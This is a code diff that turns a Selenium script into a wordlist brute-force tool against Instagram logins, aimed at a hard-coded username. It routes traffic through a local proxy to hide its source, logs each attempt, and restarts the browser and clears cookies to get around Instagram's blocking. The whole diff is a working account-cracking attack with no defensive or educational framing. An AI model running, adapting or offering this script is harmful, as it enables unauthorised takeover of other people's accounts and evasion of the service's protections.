@@ -1,12 +1,15 @@
 #!/usr/bin/python
 from selenium import webdriver
 from selenium.webdriver.common.keys import Keys
+import time
 
 username = 'redhootcp'
-password = 'test'
+delay = 0
+passwords = [ '666666' ]
+
+report_file = 'report.log'
 
 def login():
-    driver = webdriver.Firefox()
     driver.get('https://www.instagram.com/accounts/login/?force_classic_login')
     assert "Instagram" in driver.title
     elem = driver.find_element_by_name("username")
@@ -16,8 +19,38 @@ def login():
     elem.clear()
     elem.send_keys(password)
     elem.send_keys(Keys.RETURN)
-    driver.close()
+#    time.sleep(delay)
+
+def browser_config():
+    profile = webdriver.FirefoxProfile()
+    profile.set_preference("network.proxy.http", "localhost")
+    profile.set_preference("network.proxy.http_port", 8118)
+    profile.set_preference("network.proxy.no_proxies_on", "")
+    profile.set_preference("network.proxy.ssl", "localhost")
+    profile.set_preference("network.proxy.ssl_port", 8118)
+    profile.set_preference("network.proxy.type", 1)
+    return profile
 
 with open('wordlist.txt', 'r') as f:
-    line = f.readlines()
-    print line
+    profile = browser_config()
+    driver = webdriver.Firefox(profile)
+    passwords = f.readlines()
+
+
+    report= open(report_file, 'wt')
+    for line in passwords:
+        password = line.rstrip()
+        login()
+        print "%s %s %s " % (time.strftime("%Y-%m-%d %H:%M"), driver.title, password)
+        report.write("%s %s \n" % (time.strftime("%Y-%m-%d %H:%M"), password))
+
+        if 'Page Not Found' in driver.title:
+            while ('Page Not Found' in driver.title):
+                driver.close()
+                time.sleep(10)
+                driver = webdriver.Firefox()
+                driver.delete_all_cookies()
+                print "%s %s %s " % (time.strftime("%Y-%m-%d %H:%M"), driver.title, password)
+                report.write("%s %s \n" % (time.strftime("%Y-%m-%d %H:%M"), password))
+                login()
+report.close()
